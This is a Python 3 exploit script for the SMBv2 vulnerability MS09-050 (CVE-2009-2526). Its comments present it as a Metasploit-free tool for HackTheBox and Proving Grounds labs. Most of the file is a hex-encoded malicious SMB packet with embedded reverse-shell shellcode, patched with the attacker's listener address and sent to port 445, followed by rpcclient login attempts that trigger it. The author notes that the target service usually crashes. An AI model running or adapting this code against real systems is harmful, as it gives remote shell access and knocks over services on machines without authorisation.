# PREREQUISITES: Make sure you can execute the rpcclient in your system, needed to poke logins.
# USAGE: Change the parameters according to your needs, launch a listener and run the exploit.
#
# DESCRIPTION
# Basically an updated ms09-050 (CVE-2009-2526) exploit written in Python3. The ones I found online
# were not working most of the time for me and I wanted to have something outside Metasploit to
# exploit this stuff in Proving Grounds or HackTheBox.
#
# TESTS
# It is pretty reliable getting a shell back but the service normally crash, ups!

import binascii
import socket
import subprocess
from time import sleep


# CHANGE THIS
target_ip = '192.168.240.40'
target_port = 445
l_address = '192.168.45.172'
l_port = 443

# Basically, I took the malicious packet generated by the Metasploit implementation of this exploit
# using Netcat, the payload used is windows/shell_reverse_tcp to catch the shell without a stager.
packet = b''
packet += b'00000380ff534d4272000000001853c8170200e95801000000000000000000000000a'
packet += b'974005d0302040ddfff040ddfff040ddfff040ddfff040ddfff040ddfff040ddfff04'
packet += b'0ddfff040ddfff040ddfff040ddfff040ddfff040ddfff040ddfff040ddfff040ddff'
packet += b'f040ddfff040ddfff040ddfff040ddfff040ddfff040ddfff040ddfff040ddfff040d'
packet += b'dfff0002534d4220322e3030320000000000000000000000000000000000000000000'
packet += b'000000000000000000000000000000000000000000000000000000000000000000000'
packet += b'000000000000000000000000000000000000000000000000000000000000000000000'
packet += b'000000000000000000000000000000000000000000000000000000000000000000000'
packet += b'000000000000000000000000000000000000000000000000ffffffffffffffff42424'
packet += b'242424242424242424242424242424242424242424242424242b4ffff3f4141414141'
packet += b'41414141414141414141414141414141414141090dd0fffcfaeb1e5e6876010000590'
packet += b'f3289465d8b7e6189f80f30b9f8010000f3a4fbf4ebfde8ddffffff6a009c60e80000'
packet += b'0000588b5854895c242481f9dec0adde751068760100005989d831d20f3031c0eb318'
packet += b'b320fb61e6681fbc30075258b585c8d5b69891ab8010000800fa281e200001000740e'
packet += b'ba00ff3fc083c2048122ffffff7f619dc3ffffffff0004dfff0004fe7f606a3058996'
packet += b'48b1839530c742b8b43108b403c83c0288b0803480381f96c6173737515e807000000'
packet += b'e80d000000eb09b9dec0adde89e20f3461c381c454f2fffffce8820000006089e531c'
packet += b'0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252'
packet += b'578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffa'
packet += b'cc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b04'
packet += b'8b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f546'
packet += b'84c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdf'
packet += b'e0ffd5976a05687f000002680200223d89e66a1056576899a57461ffd585c0740cff4'
packet += b'e0875ec68f0b5a256ffd568636d640089e357575731f66a125956e2fd66c744243c01'
packet += b'018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306'
packet += b'808871d60ffd5bbe01d2a0a68a695bd9dffd53c067c0a80fbe07505bb4713726f6a00'
packet += b'53ffd5'

# Update packet with attacker info
hex_l_ip = socket.inet_aton(l_address).hex().encode()
hex_l_port = l_port.to_bytes(2, "big").hex().encode()
packet = packet.replace(b'7f000002', hex_l_ip).replace(b'223d', hex_l_port)

print('Sending payload...')
smb_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
smb_sock.connect((target_ip, target_port))
smb_sock.sendall(binascii.unhexlify(packet))
smb_sock.close() 

print('Sending logins...')
logins = ['Guest', 'Administrator']
for login in logins:
	subprocess.call(f"echo '1223456' | rpcclient -U {login} {target_ip}", 
					stderr=subprocess.DEVNULL, 
					stdout=subprocess.DEVNULL,
					shell=True)

print('Logins sent! Check you listener, it may take some time...')
